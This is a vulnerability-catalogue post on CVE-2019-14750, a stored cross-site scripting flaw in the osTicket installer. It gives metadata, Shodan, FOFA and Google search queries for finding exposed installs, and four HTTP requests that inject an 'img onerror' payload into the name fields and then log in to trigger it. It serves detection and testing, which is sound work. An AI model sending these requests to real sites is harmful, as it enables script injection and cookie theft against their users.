---
layout: "post"
cve_id: "CVE-2019-14750"
title: "osTicket < 1.12.1 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-14750.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-14750.yaml"
author: "TenBird"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential data theft or unauthorized actions.
"
remediation: "Upgrade osTicket to version 1.12.1 or later to mitigate this vulnerability.
"
reference:
  - "https://packetstormsecurity.com/files/154005/osTicket-1.12-Cross-Site-Scripting.html"
  - "https://nvd.nist.gov/vuln/detail/CVE-2019-14750"
  - "http://packetstormsecurity.com/files/154005/osTicket-1.12-Cross-Site-Scripting.html"
  - "https://github.com/osTicket/osTicket/commit/c3ba5b78261e07a883ad8fac28c214486c854e12"
  - "https://github.com/osTicket/osTicket/releases/tag/v1.10.7"
classification:
  cvss-metrics: "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
  cvss-score: 6.1
  cve-id: "CVE-2019-14750"
  cwe-id: "CWE-79"
  epss-score: 0.03327
  epss-percentile: 0.86846
  cpe: "cpe:2.3:a:osticket:osticket:*:*:*:*:*:*:*:*"
metadata:
  max-request: 4
  vendor: "osticket"
  product: "osticket"
  shodan-query: ['title:"osTicket"', 'http.title:"osticket"', 'http.html:"powered by osticket"', 'http.title:"osticket installer"']
  fofa-query: ['title="osticket"', 'body="powered by osticket"', 'title="osticket installer"']
  google-query: ['intitle:"osticket"', 'intitle:"osticket installer"']
tags:
  - "cve"
  - "cve2019"
  - "packetstorm"
  - "osticket"
  - "xss"
  - "intrusive"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
An issue was discovered in osTicket before 1.10.7 and 1.12.x before 1.12.1. Stored XSS exists in setup/install.php. It was observed that no input sanitization was provided in the firstname and lastname fields of the application. The insertion of malicious queries in those fields leads to the execution of those queries. This can further lead to cookie stealing or other malicious actions.


## ðŸŒ HTTP Request
```nohighlight
POST /upload/setup/install.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Length: 346
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

s=install&name=wmnkaj&email=qtkIef@d6t0x2.com&lang_id=en_US&fname=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E&lname=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E&admin_email=qtkIef@d6t0x2.com&username=wmnkaj&passwd=Z7WOWip9Dbm7&passwd2=Z7WOWip9Dbm7&prefix=ost_&dbhost=pqYViZ&dbname=tt&dbuser=qtkIef&dbpass=Jg2umsWM&timezone=Asia%2FTokyo
```

```nohighlight
GET /upload/scp/login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /upload/scp/login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Connection: close
Content-Length: 73
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

__CSRFToken__=bh1zvp&do=scplogin&userid=wmnkaj&passwd=Z7WOWip9Dbm7&ajax=1
```

```nohighlight
GET /upload/scp/settings.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```


